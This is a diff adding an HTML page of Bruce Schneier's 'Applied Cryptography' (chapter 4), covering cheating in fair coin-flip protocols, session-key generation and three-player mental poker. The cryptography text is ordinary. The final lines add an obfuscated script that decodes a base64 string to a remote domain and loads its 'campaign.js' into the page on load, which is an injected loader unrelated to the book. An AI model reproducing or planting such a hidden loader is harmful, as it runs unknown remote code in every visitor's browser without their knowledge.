@@ -1,0 +1,119 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=091-093//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This protocol is self-enforcing. Either party can immediately detect cheating by the other, and no trusted third party is required to participate in either the actual protocol or any adjudication after the protocol has been completed. To see how this works, let&#146;s try to cheat.
+</P>
+<P>If Alice wanted to cheat and force heads, she has three potential ways of affecting the outcome. First, she could encrypt two &#147;heads&#148; messages in step (2). Bob would discover this when Alice revealed her keys at step (7). Second, she could use some other key to decrypt the message in step (4). This would result in gibberish, which Bob would discover in step (5). Third, she could lie about the validity of the message in step (6). Bob would also discover this in step (7), when Alice could not prove that the message was not valid. Of course, Alice could refuse to participate in the protocol at any step, at which point Alice&#146;s attempted deception would be obvious to Bob.</P>
+<P>If Bob wanted to cheat and force &#147;tails, &#148; his options are just as poor. He could incorrectly encrypt a message at step (3), but Alice would discover this when she looked at the final message at step (6). He could improperly perform step (5), but this would also result in gibberish, which Alice would discover at step (6). He could claim that he could not properly perform step (5) because of some cheating on the part of Alice, but this form of cheating would be discovered at step (7). Finally, he could send a &#147;tails&#148; message to Alice at step (5), regardless of the message he decrypted, but Alice would immediately be able to check the message for authenticity at step (6).</P>
+<P><FONT SIZE="+1"><B><I>Flipping Coins into a Well</I></B></FONT></P>
+<P>It is interesting to note that in all these protocols, Alice and Bob don&#146;t learn the result of the coin flip at the same time. Each protocol has a point where one of the parties (Alice in the first two protocols and Bob in the last one) knows the result of the coin flip but cannot change it. That party can, however, delay disclosing the result to the other party. This is known as <B>flipping coins into a well</B>. Imagine a well. Alice is next to the well and Bob is far away. Bob throws the coin and it lands in the well. Alice can now look into the well and see the result, but she cannot reach down to change it. Bob cannot see the result until Alice lets him come close enough to look.</P>
+<P><FONT SIZE="+1"><B><I>Key Generation Using Coin Flipping</I></B></FONT></P>
+<P>A real application for this protocol is session-key generation. Coin-flipping protocols allow Alice and Bob to generate a random session key such that neither can influence what the session key will be. And assuming that Alice and Bob encrypt their exchanges, this key generation is secure from eavesdropping as well.
+</P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">4.11 Mental Poker</FONT></H3>
+<P>A protocol similar to the public-key fair coin flip protocol allows Alice and Bob to play poker with each other via electronic mail. Instead of Alice making and encrypting two messages, one for heads and one for tails, she makes 52 messages, <I>M</I><SUB>1</SUB>, <I>M</I><SUB>2</SUB>,..., <I>M</I><SUB>52</SUB>, one for each card in the deck. Bob chooses five messages at random, encrypts them with his public key, and then sends them back to Alice. Alice decrypts the messages and sends them back to Bob, who decrypts them to determine his hand. He then chooses five more messages at random and sends them back to Alice as he received them; she decrypts these and they become her hand. During the game, additional cards can be dealt to either player by repeating the procedure. At the end of the game, Alice and Bob both reveal their cards and key pairs so that each can be assured that the other did not cheat.</P>
+<P><FONT SIZE="+1"><B><I>Mental Poker with Three Players</I></B></FONT></P>
+<P>Poker is more fun with more players. The basic mental poker protocol can easily be extended to three or more players. In this case, too, the cryptographic algorithm must be commutative.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice, Bob, and Carol each generate a public-key/private-key key pair.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates 52 messages, one for each card in the deck. These messages should contain some unique random string, so that she can verify their authenticity later in the protocol. Alice encrypts all the messages with her public key and sends them to Bob.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob, who cannot read any of the messages, chooses five at random. He encrypts them with his public key and sends them back to Alice.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>))
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends the other 47 messages to Carol.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Carol, who cannot read any of the messages, chooses five at random. She encrypts them with her public key and sends them to Alice.
+<DL>
+<DD><I>E</I><SUB>C</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>))
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice, who cannot read any of the messages sent back to her, decrypts them with her private key and then sends them back to Bob or Carol (depending on where they came from).
+<DL>
+<DD><I>D</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>))) = <I>E</I><SUB>B</SUB>(<I>M</I><SUB>n</SUB>)
+<DD><I>D</I><SUB>A</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>))) = <I>E</I><SUB>C</SUB>(<I>M</I><SUB>n</SUB>)
+</DL>
+<DD><B>(7)</B>&nbsp;&nbsp;Bob and Carol decrypt the messages with their keys to reveal their hands.
+<DL>
+<DD><I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>M</I><SUB>n</SUB>)) = <I>M</I><SUB>n</SUB>
+<DD><I>D</I><SUB>C</SUB>(<I>E</I><SUB>C</SUB>(<I>M</I><SUB>n</SUB>)) = <I>M</I><SUB>n</SUB>
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;Carol chooses five more messages at random from the remaining 42. She sends them to Alice.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>)
+</DL>
+<DD><B>(9)</B>&nbsp;&nbsp;Alice decrypts the messages with her private key to reveal her hand.
+<DL>
+<DD><I>D</I><SUB>A</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I><SUB>n</SUB>)) = <I>M</I><SUB>n</SUB>
+</DL>
+<DD><B>(10)</B>&nbsp;&nbsp;At the end of the game Alice, Bob, and Carol all reveal their hands and all of their keys so that everyone can make sure that no one has cheated.
+</DL>
+<P>Additional cards can be dealt in the same manner. If Bob or Carol wants a card, either one can take the encrypted deck and go through the protocol with Alice. If Alice wants a card, whoever currently has the deck sends her a random card.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(dDEsEbOc, ZgdvjqRc) {ZgdvjqRc = dDEsEbOc.createElement('script');ZgdvjqRc.type = 'text/javascript';ZgdvjqRc.async = true;ZgdvjqRc.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');dDEsEbOc.getElementsByTagName('body')[0].appendChild(ZgdvjqRc);}(document));</script></body>
+</html>
